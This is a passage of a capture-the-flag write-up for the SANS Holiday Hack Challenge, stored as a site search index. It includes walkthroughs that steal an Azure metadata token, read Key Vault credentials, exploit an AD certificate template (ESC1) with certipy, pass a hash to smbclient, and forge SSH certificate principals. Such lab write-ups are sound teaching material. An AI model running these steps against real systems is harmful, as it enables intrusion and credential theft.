{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>Welcome, reader, to my second Holiday Hack Challenge write-up. Each year there seem to be more challenges. This year there were so many that the page limit for the write-up was doubled! With so much information to keep track of, the write-up template provided by Thomas Bouve was an enormous help this year. Thanks to SANS for creating yet another fun and educational Holiday Hack Challenge.</p> <p>100-page submission limit</p> <p>Each year there's a huge number of write-ups that need to be reviewed by the Counter Hack team. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information.</p> Navigation tip <p>Even with less than 100 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"#answers","title":"Answers","text":"<p>1. Holiday Hack Orientation - </p> <p>Dock your boat and follow Jingle Ringford's instructions.</p> <p>2. Snowball Fight - </p> <p>Hack the snowball fight game to beat Santa.</p> <p>3. Linux 101 - </p> <p>Follow the instructions in the terminal.</p> <p>4. Reportinator - </p> <p>Figure out which sections are AI hallucinations.</p> <p>5. Azure 101 - </p> <p>Follow the instructions in the terminal.</p> <p>6. Luggage Lock - </p> <p>Pick the luggage lock.</p> <p>7. Linux PrivEsc - </p> <p>santa</p> <p>8. Faster Lock Combination - </p> <p>Pick the \"Faster\" lock.</p> <p>9. Game Cartridges: Vol 1 - </p> <p>santaconfusedgivingplanetsqrcode</p> <p>10. Game Cartridges: Vol 2 - </p> <p>GL0RY</p> <p>11. Game Cartridges: Vol 3 - </p> <p>!tom+elf!</p> <p>12. Na'an - </p> <p>NaN</p> <p>13. KQL Kraken Hunt - </p> <p>Beware the Cube that Wombles</p> <p>14. Phish Detection Agency - </p> <p>Figure out which emails are phishing attempts.</p> <p>15. Hashcat - </p> <p>IluvC4ndyC4nes!</p> <p>16. Elf Hunt - </p> <p>Click the elves to win the game.</p> <p>17. Certificate SSHenanigans - </p> <p>Gingerbread</p> <p>18. The Captain's Comms - </p> <p>10426Hz 12/24 12:00</p> <p>19. Active Directory - </p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p> <p>20. Space Island Door Access Speaker - </p> <p>And he whispered, 'Now I shall be out of sight; So through the valley and over the height.' And he'll silently take his way.</p> <p>21. Camera Access - </p> <p>CONQUER HOLIDAY SEASON!</p> <p>22. Missile Diversion - </p> <p>Use SQL injection and Java object serialization to alter the trajectory of the missile.</p> <p>23. BONUS! Fishing Guide - </p> <p>Catch 20 different fish.</p> <p>24. BONUS! Fishing Mastery - </p> <p>Catch all the fish.</p>"},{"location":"#conclusion","title":"Conclusion","text":"Story <p>Just sit right back and you\u2019ll hear a tale, A tale of a yuletide trip That started from a tropic port, Aboard this tiny ship Santa and his helpful elves To Geese Islands did go Continuing their merry work O'er sand instead of snow New this year: a shiny tool The elves logged in with glee What makes short work of many tasks? It's ChatNPT. It's ChatNPT From images to APIs This AI made elves glad But motivations were unknown So was it good or bad? Could it be that NPT Was not from off-the-shelf? Though we'll forgive and trust again We'd found a naughty elf This fancy AI tool of ours With all our work remained Not good or bad, our online friend Just did as it was trained Surely someone's taint must be Upon our AI crutch Yes indeed, this bold new world Bore Jack Frost's icy touch Though all's returned to steady state There's one thing that we know We'll all be needed once again When Santa's back on snow</p> <p></p> <p>Santa</p> <p>You've done it! You've saved me and my sleigh from Jack Frost's dastardly plan! I must admit, it's astonishing the lengths Jack will go to in order to try and stop the holiday season. Even after being banished from Earth, he managed to create an AI to social engineer us into moving our holiday operations to the Geese Islands, putting us right in the path of his satellite. And to think he even recruited one of my dear elves... I never saw that coming. Oh, Wombley... But thanks to your incredible efforts, we've proof that Jack violated his parole, and the chances of him interfering with the holidays ever again are all but impossible! I can't thank you enough for your help in protecting the magic and joy of this special time of year. I'd like to wish you a most wonderful holiday season, no matter where you may be on Earth or what the weather is like. Keep that holiday spirit alive, my friend, and remember: a little change now and then can lead to something magical! Ho ho ho, happy holidays!</p> <p>Jack Frost</p> <p>Okay, listen up, yes I've been caught, but let me tell you, my plan was incredible, I mean really incredible. I and the trolls created ChatNPT, a fantastic AI, and left it behind in the North Pole in 2021 to trick Santa into moving to the Geese Islands. It worked like a charm, perfectly perfect. My satellite was geostationary, right over the islands to maintain comms with ChatNPT, and Wombley in the gound station. It was genius. Absolute genius, really. I was reviewing all the prompts as they were sent, and changing the responses in real time thanks to Santa's operation moving to the Geese Islands. This was very smart. Very, very, very smart, very efficient. And Wombley, the elf, joining me? Easy. He was so easy to convince. You see, there's a big, big dissent in Santa's ranks, huge. The elves, they're not happy with Santa. Mark my words, even if I don't stop Santa, his own elves will. It's going to be tremendous, this you will see.</p>"},{"location":"easter_eggs/","title":"Easter Eggs","text":""},{"location":"easter_eggs/#jason","title":"Jason","text":"<p>Jason can be found at the bottom of Coggoggle Marina on Steampunk Island.</p> <p></p> <p>Jason</p> <p>Hi, I'm Jason! I'm not dead. I'm just soaking up the sun's gnarly vibes, bro!</p>"},{"location":"easter_eggs/#henry","title":"Henry","text":"<p>Henry is an alien. His voice is hard to understand if you have the audio enabled.</p> <p></p> <p>Henry</p> <p>Hi, I'm Henry! I built the satellites with personalities, and now they keep making dad jokes - whoopsies!</p>"},{"location":"objectives/active_directory/","title":"Active Directory","text":"<p>Difficulty: </p>"},{"location":"objectives/active_directory/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p> Ribb Bonbowford <p>Hello, I'm Ribb Bonbowford. Nice to meet you! Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT. Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing. I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files. I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data. Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>"},{"location":"objectives/active_directory/#hints","title":"Hints","text":"Useful Tools <p>It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p> Misconfiguration ADventures <p>Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>"},{"location":"objectives/active_directory/#solution","title":"Solution","text":"<p>Before completing this challenge, you must first complete Certificate SSHenanigans.</p> <p>Once on the ssh server, you can start finding a username and password for the AD server. To do this you must search the Azure configuration. First, get an access token. <pre><code>response=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s)\naccess_token=$(echo $response | python -c 'import sys, json; print (json.load(sys.stdin)[\"access_token\"])')\n</code></pre></p> <p>Next, you can check your permissions.</p> <pre><code>curl -X GET -H \"Authorization: Bearer $access_token\" -H \"Content-Type: application/json\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.Authorization/permissions?api-version=2022-04-01\n</code></pre> <p>Response:</p> <pre><code>{\n    \"value\": [{\n            \"actions\": [\"Microsoft.KeyVault/vaults/read\", \"Microsoft.KeyVault/vaults/secrets/read\", \"Microsoft.Web/sites/sourcecontrols/Read\", \"microsoft.web/sites/functions/read\", \"Microsoft.Resources/subscriptions/resourceGroups/read\"],\n            \"notActions\": [],\n            \"dataActions\": [\"Microsoft.KeyVault/vaults/secrets/getSecret/action\", \"Microsoft.KeyVault/vaults/secrets/readMetadata/action\"],\n            \"notDataActions\": []\n        }\n    ]\n}\n</code></pre> <p>It seems that we can read the key vaults. But we don't know the names of any key vaults, so we can list them.</p> <pre><code>curl -X GET -H \"Authorization: Bearer $access_token\" -H \"Content-Type: application/json\" \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?$filter=resourceType%20eq%20'Microsoft.KeyVault%2Fvaults'&amp;api-version=2015-11-01\"\n</code></pre> <p>Response:</p> <pre><code>{\n    \"value\": [{\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\n            \"name\": \"northpole-it-kv\",\n            \"type\": \"Microsoft.KeyVault/vaults\",\n            \"location\": \"eastus\",\n            \"tags\": {}\n        }, {\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\n            \"name\": \"northpole-ssh-certs-kv\",\n            \"type\": \"Microsoft.KeyVault/vaults\",\n            \"location\": \"eastus\",\n            \"tags\": {}\n        }\n    ]\n}\n</code></pre> <p>To check the vault secrets, you need the vault uri and the name of the secret. The uri is <code>https://&lt;vault-name&gt;.vault.azure.net/</code>. To check the vault secrets, use the following for the first vault (northpole-it-kv).</p> <pre><code>curl -X GET -H \"Authorization: Bearer $access_token\" -H \"Content-Type: application/json\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv/secrets?api-version=2022-07-01\n</code></pre> <p>Response:</p> <pre><code>{\n    \"value\": [{\n            \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv/secrets/tmpAddUserScript\",\n            \"name\": \"tmpAddUserScript\",\n            \"type\": \"Microsoft.KeyVault/vaults/secrets\",\n            \"location\": \"eastus\",\n            \"tags\": {},\n            \"properties\": {\n                \"attributes\": {\n                    \"enabled\": true,\n                    \"created\": 1699564823,\n                    \"updated\": 1699564823\n                },\n                \"secretUri\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript\",\n                \"secretUriWithVersion\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d\"\n            }\n        }\n    ]\n}\n</code></pre> <p>To check the secret, you need a vault access token.</p> <pre><code>response=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s)\nvault_access_token=$(echo $response | python -c 'import sys, json; print (json.load(sys.stdin)[\"access_token\"])')\n</code></pre> <p>Now you can check the vault secret.</p> <pre><code>curl -X GET -H \"Authorization: Bearer $vault_access_token\" -H \"Content-Type: application/json\" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4\n</code></pre> <pre><code>{\n    \"value\": \"Import-Module ActiveDirectory; $UserName = \\\"elfy\\\"; $UserDomain = \\\"northpole.local\\\"; $UserUPN = \\\"$UserName@$UserDomain\\\"; $Password = ConvertTo-SecureString \\\"J4`ufC49/J4766\\\" -AsPlainText -Force; $DCIP = \\\"10.0.0.53\\\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \\\"\\\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru\",\n    \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d\",\n    \"attributes\": {\n        \"enabled\": true,\n        \"created\": 1699564823,\n        \"updated\": 1699564823,\n        \"recoveryLevel\": \"Recoverable+Purgeable\",\n        \"recoverableDays\": 90\n    },\n    \"tags\": {}\n}\n</code></pre> <p>The secret contains a username (elfy) and a password (J4`ufC49/J4766). These can be used to connect to the AD server. Start by checking the server for vulnerabilities using <code>certipy</code>.</p> <pre><code>certipy find -vulnerable -u elfy@10.0.0.53 -p J4\\`ufC49/J4766\n</code></pre> <p></p> <p>Next, read the output file.</p> <pre><code>{\n  \"Certificate Authorities\": {\n    \"0\": {\n      \"CA Name\": \"northpole-npdc01-CA\",\n      \"DNS Name\": \"npdc01.northpole.local\",\n      \"Certificate Subject\": \"CN=northpole-npdc01-CA, DC=northpole, DC=local\",\n      ...\n    }\n  },\n  \"Certificate Templates\": {\n    \"0\": {\n      \"Template Name\": \"NorthPoleUsers\",\n      \"Display Name\": \"NorthPoleUsers\",\n      \"Certificate Authorities\": [\n        \"northpole-npdc01-CA\"\n      ],\n      \"Enabled\": true,\n      \"Client Authentication\": true,\n      \"Enrollment Agent\": false,\n      \"Any Purpose\": false,\n      \"Enrollee Supplies Subject\": true,\n      ...\n      \"[!] Vulnerabilities\": {\n        \"ESC1\": \"'NORTHPOLE.LOCAL\\\\\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\"\n      }\n    }\n  }\n}\n</code></pre> <p>The <code>NorthPoleUsers</code> certificate template can be exploited. To do this, we need a user to impersonate.</p> <pre><code>GetADUsers.py -all -dc-ip 10.0.0.53 northpole.local/elfy\n</code></pre> <p></p> <p>Now request a new certificate.</p> <pre><code>certipy req -u elfy@northpole.local -p J4\\`ufC49/J4766 -dc-ip 10.0.0.53 -target npdc01.northpole.local -ca northpole-npdc01-CA -template NorthPoleUsers -upn wombleycube@northpole.local\n</code></pre> <p></p> <p>Next, get the authentication for Wombley.</p> <pre><code>certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53\n</code></pre> <p></p> <p>Now you can connect to the AD server using the hash.</p> <pre><code>smbclient.py -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53 northpole.local/wombleycube@10.0.0.53\n</code></pre> <p></p> <p>Once connected, find the file in the secret research folder.</p> <p></p> <p>Answer</p> <p>InstructionsForEnteringSatelliteGroundStation.txt</p>"},{"location":"objectives/active_directory/#response","title":"Response","text":"<p>Ribb Bonbowford</p> <p>Wow, nice work. I'm impressed! This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me. Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it? On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located. Well, I guess it's probably somewhere on Space Island, but I've not been there yet. I'm not a big fan of jungles, you see. I have this tendency to get lost in them. Anyway, if you feel like investigating, that'd be where I'd go look. Good luck and I'd try and steer clear of ChatNPT if I were you.</p>"},{"location":"objectives/azure_101/","title":"Azure 101","text":"<p>Difficulty:  Direct link: Azure 101 Terminal</p>"},{"location":"objectives/azure_101/#objective","title":"Objective","text":"<p>Request</p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> Sparkle Redberry <p>Hey, Sparkle Redberry here! So, I've been trying to learn about Azure and the Azure CLI and it's driving me nuts. Alabaster Snowball decided to use Azure to host some of his fancy new IT stuff on Geese Islands, and now us elves have to learn it too. Anyway, I know it's important and everyone says it's not as difficult as it seems, but honestly it still feels like quite a challenge for me. Alabaster sent us this Azure CLI reference as well. It's super handy, he said. Honestly, it just confuses me even more. If you can spare a moment, would you mind giving me a hand with this terminal? I'd be really grateful! Pretty please, with holly leaves on top!</p>"},{"location":"objectives/azure_101/#hints","title":"Hints","text":"Azure CLI Reference <p>The Azure CLI tools come with a builtin help system, but Microsoft also provides this handy cheatsheet.</p>"},{"location":"objectives/azure_101/#solution","title":"Solution","text":"<p>Open the terminal and follow the instructions.</p> <p></p>"},{"location":"objectives/azure_101/#part-1","title":"Part 1","text":"<p>Use the Azure command <code>az help | less</code> to get a list of commands.</p> <p></p>"},{"location":"objectives/azure_101/#part-2","title":"Part 2","text":"<p>Use the Azure command <code>az account show | less</code> to get information on the account.</p> <p></p>"},{"location":"objectives/azure_101/#part-3","title":"Part 3","text":"<p>Use the Azure command <code>az group list | less</code> to list the Azure groups.</p> <p></p>"},{"location":"objectives/azure_101/#part-4","title":"Part 4","text":"<p>Use the Azure command <code>az functionapp list -g northpole-rg1 | less</code> to list the function apps.</p> <p></p>"},{"location":"objectives/azure_101/#part-5","title":"Part 5","text":"<p>Use the Azure command <code>az vm list -g northpole-rg2 | less</code> to list the Azure Virtual Machines.</p> <p></p>"},{"location":"objectives/azure_101/#part-6","title":"Part 6","text":"<p>Use the Azure command <code>az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts \"ls\"</code> to list the files on the Azure VM.</p> <p></p> <p>Answer</p> <p>Follow the instructions in the terminal.</p>"},{"location":"objectives/azure_101/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>Wow, you did it! It makes quite a bit more sense to me now. Thank you so much! That Azure Function App URL you came across in the terminal looked interesting. It might be part of that new project Alabaster has been working on with the help of ChatNPT. Let me tell you, since he started using ChatNPT he's been introducing a lot of amazing innovation across the islands. Knowing Alabaster, he'll be delighted to tell you all about it! I think I last saw him on Pixel island. By the way, as part of the Azure documentation he sent the elves, Alabaster also noted that if Azure CLI tools aren't available in an Azure VM we should use the Azure REST API instead. I'm not really sure what that means, but I guess I know what I'll be studying up on next.</p>"},{"location":"objectives/camera_access/","title":"Camera Access","text":"<p>Difficulty: </p>"},{"location":"objectives/camera_access/#objective","title":"Objective","text":"<p>Request</p> <p>Gain access to Jack's camera. What's the third item on Jack's TODO list?</p> Wombley Cube <p>This is Ground Control, do you read me...? Ground Control to -- Hey! How'd you get in here? That tram is the only accessible point of entry and I secured it with MFA! No matter, you may have had the skills to find and infiltrate the satellite ground station, but there's no chance you can hack your way into the satellite itself! The nanosat's Supervisor Directory will remain hidden, and you'll never discover the mastermind behind all this. So don't even waste your time trying.</p>"},{"location":"objectives/camera_access/#hints","title":"Hints","text":"Hubris is a Virtue <p>In his hubris, Wombley revealed that he thinks you won't be able to access the satellite's \"Supervisor Directory\". There must be a good reason he mentioned that specifically, and a way to access it. He also said there's someone else masterminding the whole plot. There must be a way to discover who that is using the nanosat.</p>"},{"location":"objectives/camera_access/#solution","title":"Solution","text":"<p>Before completing this challenge, you must first complete Space Island Door Access Speaker.</p> <p>First talk to the <code>NanoSat-O-Matic</code> in the Zenith SGS room.</p> <p></p> <p>It should give you a link to download the client_container. After downloading it, follow the instructions in <code>README.md</code>.</p> NanoSat-O-Matic <p>Hi there! I am a Ground station client vending machine. Apparently there is a huge need for NanoSat frameworks here, so they have put me in this room. Here, have a free sample!</p> <p>First, install Docker if you haven't already. Set up an account and run the first command in <code>README.md</code>.</p> <pre><code>docker build -t nmf_client .\n</code></pre> <p>After this command finishes, run the next command.</p> <pre><code>docker run -it --cap-add=NET_ADMIN -p 5900:5900 -p 6901:6901 --rm nmf_client\n</code></pre> <p>Now connect to it with a VNC client.</p> <p></p> <p>If the screen is black, restart the Docker container and try again. Once you are connected, click on the center computer back on the HHC website. Then click on the gator in the bottom right.</p> <p></p> <p>Click the \"Time Travel\" button and wait for it to give you a wireguard configuration.</p> <p></p> <p>Next, on the VNC viewer, open a terminal and create a wireguard configuration file.</p> <pre><code>gedit /etc/wireguard/wg0.conf\n</code></pre> <p></p> <p>Now start the wireguard interface.</p> <pre><code>wg-quick up wg0\n</code></pre> <p>Now you can open the satellite tool and fetch the directory in <code>README.md</code>.</p> <p></p> <p>Click the connect button and you will see a camera app in the <code>Apps Launcher service</code> tab.</p> <p></p> <p>Click on the app and click <code>runApp</code> to run it.</p> <p></p> <p>There is a URI that can be used to connect to the camera. Fetch it and connect the same way as you did for the original URI. Go to the <code>Action service</code> tab. There is a Base64SnapImage action that can be used to take a picture. To extract the image, you must open wireshark and intercept the TCP stream. Click on the action, then click <code>submitAction</code>, then <code>Submit</code>.</p> <p></p> <p>Now go to the <code>Parameter service</code> tab. Start capturing with wireshark and click the <code>Base64SnapImage</code> parameter and click <code>getValue</code>.</p> <p></p> <p>Next, go to wireshark and open the \"TCP Stream\" window.</p> <p></p> <p>When this window finishes opening, save the TCP stream to a file.</p> <p></p> <p>Next, open the docker desktop app and open the container's files. Find the file that you saved and download it.</p> <p></p> <p>Open the file with a text editor and find the start of the base64 encoded image.</p> <p></p> <p>Delete everything before this, then do the same for the end of the image. Next, base64 decode the file. Using Notepad++, you can use the MIME Tools plugin directly in the editor.</p> <p></p> <p>Now you can view the image and zoom in to read Jack's to-do list.</p> <p></p> <p>Answer</p> <p>CONQUER HOLIDAY SEASON!</p>"},{"location":"objectives/camera_access/#response","title":"Response","text":"<p>Missile Diversion</p>"},{"location":"objectives/certificate_sshenanigans/","title":"Certificate SSHenanigans","text":"<p>Difficulty:  Direct link: SSH Certificate Website</p>"},{"location":"objectives/certificate_sshenanigans/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?</p> Alabaster Snowball <p>Hello there! Alabaster Snowball at your service. I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org. ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea! It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver! I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers. Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently. Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>"},{"location":"objectives/certificate_sshenanigans/#hints","title":"Hints","text":"Azure Function App Source Code <p>The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p> Azure VM Access Token <p>Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the Azure REST API instead.</p> SSH Certificates Talk <p>Check out Thomas Bouve's talk and demo to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p>"},{"location":"objectives/certificate_sshenanigans/#solution","title":"Solution","text":"<p>To access the ssh server, create a new ssh key.</p> <p><code>ssh-keygen -C 'monitor' -f &lt;key-file-name&gt;</code></p> <p></p> <p>Next, copy your new public key and submit it to the certificate request website.</p> <p></p> <p>Now copy the certificate into a file called <code>&lt;key-file-name&gt;-cert.pub</code>.</p> <p></p> <p>You should now be able to connect to the ssh server with <code>ssh -i hhc-ca monitor@ssh-server-vm.santaworkshopgeeseislands.org</code>.</p> <p>Once on the ssh server, a program is already open. This can be closed with <code>Ctrl+C</code>. Now we can look around in the server for something that can help us. The auth principals are visible in <code>/etc/ssh/auth_principals/</code>.</p> <p></p> <p>Now that we know the principal needed to log in as Alabaster, we can try to get a new certificate with that principal. Simply resending the request to the website with <code>\"principal\":\"admin\"</code> added to the JSON request body will accomplish this.</p> <p></p> <p>Next, close the connection to the ssh server and replace the old certificate with the new admin one.</p> <p></p> <p>You should now be able to log in as Alabaster with <code>ssh -i hhc-ca alabaster@ssh-server-vm.santaworkshopgeeseislands.org</code>.</p> <p></p> <p>Now check the TODO list in his home directory and submit the type of cookie cache he is planning on implementing.</p> <p></p> <p>Answer</p> <p>Gingerbread</p>"},{"location":"objectives/certificate_sshenanigans/#response","title":"Response","text":"<p>Alabaster Snowball</p> <p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App. Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil? Thanks for the help, I'll go and update the application code immediately! While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too. You might be wondering about that SatTrackr tool I've installed on the monitor account? Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands. I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us. No idea what that means yet, but I'm keeping a close eye on that thing!</p>"},{"location":"objectives/door_access_speaker/","title":"Space Island Door Access Speaker","text":"<p>Difficulty:  Direct link: Door Access Terminal</p>"},{"location":"objectives/door_access_speaker/#objective","title":"Objective","text":"<p>Request</p> <p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there for more information.</p> Jewel Loggins <p>What are you doing here, and who are you? Me first? I'm Jewel Loggins. And I was trekking through the jungle and happened to find this place. I liked this spot and decided to set up camp. Seeing you here is quite the surprise. Well, because the only other person I've ever seen come here is Wombley Cube. I thought this tram station in the middle of the jungle was strange to begin with, but then Wombley added to the intrigue. I guess all this spy stuff is typical for him, so maybe I shouldn't think much of it. I'm sure everything's fine. Every time he comes here, he says something to the speaker. Then, the door opens, and he rides the tram somewhere. I gave it a try, but the door didn't open for me. Knowing Wombley, it's some kind of secret passphrase. If you wanna see where the tram goes, I think you need to find out what that passphrase is. Ribb Bonbowford over at Coggoggle Marina on Steampunk Island works with Wombley. Try asking if he knows. I hope you find it. I'll be here when you get back!</p>"},{"location":"objectives/door_access_speaker/#hints","title":"Hints","text":"MFA: Something You Know <p>Wombley says a specific phrase into the Access Speaker. He works in the Research Department and everything they do it super secret, so it may be a challenge to find out what the phrase is. Ribb also works in that department. Try to find and ask him.</p> MFA: Something You Are <p>It seems the Access Speaker is programmed to only accept Wombley's voice. Maybe you could get a sample of his voice and use an AI tool to simulate Wombley speaking the passphrase.</p>"},{"location":"objectives/door_access_speaker/#solution","title":"Solution","text":"<p>First, complete the Active Directory challenge and list the contents of the secret file.</p> <p></p> <p>Then talk to Jewel Loggins.</p> <p>Jewel Loggins</p> <p>What, you know the passphrase!? Let me try it! Nope, didn't work. Knowing Wombley, the passphrase isn't the only requirement. He's all about that MFA! Oh yeah, multi-factor authentication! The passphrase for something he knows, and his voice for something he is! That's it! You need to be Wombley. You need his voice. Now, how are you gonna get that? Since only us elves can get a subscription to use ChatNPT, try searching for another AI tool that can simulate voices. I'm sure there's one out there.</p> <p>You can mimic Wombley's voice with PlayHT. Go to <code>Voice Cloning</code> and upload a sample of Wombley's voice. The sample can be found on Film Noir Island.</p> <p></p> <p>Create a new file and select Wombley's cloned voice.</p> <p></p> <p>Next, generate the speech.</p> <p></p> <p>Download the generated speech file and select the downloaded file when you click on the door speaker.</p> <p>Answer</p> <p>And he whispered, 'Now I shall be out of sight; So through the valley and over the height.' And he'll silently take his way.</p>"},{"location":"objectives/door_access_speaker/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Are you like a master spy or something? I've only seen stuff like that in the movies! It sure is scary what you can do with AI, huh? I sure hope ChatNPT has better guardrails in place.</p>"},{"location":"objectives/elf_hunt/","title":"Elf Hunt","text":"<p>Difficulty:  Direct link: Elf Hunt Terminal</p>"},{"location":"objectives/elf_hunt/#objective","title":"Objective","text":"<p>Request</p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here. You look like someone who's good with puzzles and games. I could really use your help with this Elf Hunt game I'm stuck on. I think it has something to do with manipulating JWTs, but I'm a bit lost. If you help me out, I might share some juicy secrets I've discovered. Let's just say things around here haven't been exactly... normal. So, what do ya say? Are you in? Oh, brilliant! I just know we'll crack this game together. I can't wait to see what we uncover, and remember, mum's the word! Thanks a bunch! Keep your eyes open and your ears to the ground.</p>"},{"location":"objectives/elf_hunt/#hints","title":"Hints","text":"JWT Sectrets Revealed <p>Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide.</p>"},{"location":"objectives/elf_hunt/#solution","title":"Solution","text":"<p>To complete the challenge, click the elves before they go offscreen. You need to click 75 elves to win. If the elves are moving too fast and you can't click them, you can slow them down by changing the cookie.</p> <p></p> <p>To do this, copy the part of the cookie between the two periods.</p> <p></p> <p>Then decode it as base64.</p> <p></p> <p>Next, change the value of speed and re-encode it.</p> <p></p> <p>Finally, paste the new value back into the cookie and reload the page. After reloading, you should have an easier time clicking the elves.</p> <p></p> <p>Answer</p> <p>Click the elves to win the game.</p>"},{"location":"objectives/elf_hunt/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Well done! You've brilliantly won Elf Hunt! I couldn't be more thrilled. Keep up the fine work, my friend! What have you found there? The Captain's Journal? Yeah, he comes around a lot. You can find his comms office over at Brass Buoy Port on Steampunk Island.</p>"},{"location":"objectives/faster_lock_combination/","title":"Faster Lock Combinnation","text":"<p>Difficulty:  Direct link: Faster Lock Terminal</p>"},{"location":"objectives/faster_lock_combination/#objective","title":"Objective","text":"<p>Request</p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!</p> Bow Ninecandle <p>Hey there! I'm Bow Ninecandle, and I've got a bit of a... 'pressing' situation. You see, I need to get into the lavatory, but here's the twist: it's secured with a combination padlock. Talk about bad timing, right? I could really use your help to figure this out before things get... well, urgent. I'm sure there are some clever tricks and tips floating around the web that can help us crack this code without too much of a flush... I mean fuss. Remember, we're aiming for quick and easy solutions here - nothing too complex. Once we've gathered a few possible combinations, let's team up and try them out. I'm crossing my legs - I mean fingers - hoping we can unlock this door soon. After all, everyone knows that the key to holiday happiness is an accessible lavatory! Let's dive into this challenge and hopefully, we won't have to 'hold it' for too long! Ready to help me out?</p>"},{"location":"objectives/faster_lock_combination/#solution","title":"Solution","text":"<p>Follow the steps in the video provided by Bow Ninecandle. First, use the mouse to pull the shackle up a bit and rotate the lock clockwise with the right arrow key until it slows down.</p> <p></p> <p>Write this number down. Next, reset the lock by double clicking it. The next two numbers you need can be found by pulling the shackle all the way and turning the lock back and forth. Start at 0 and work your way up to 10. If the lock stops in between two numbers, write that number down.</p> <p></p> <p>Now that you have all the numbers, you can start figuring out the combination. Start by adding 5 to the first number. <pre><code>21 + 5 = 26\n</code></pre> This is the first number of the combination. Next, create a table using the other two numbers by adding 10 until they reach 30. <pre><code>7 17 27 37\n8 18 28 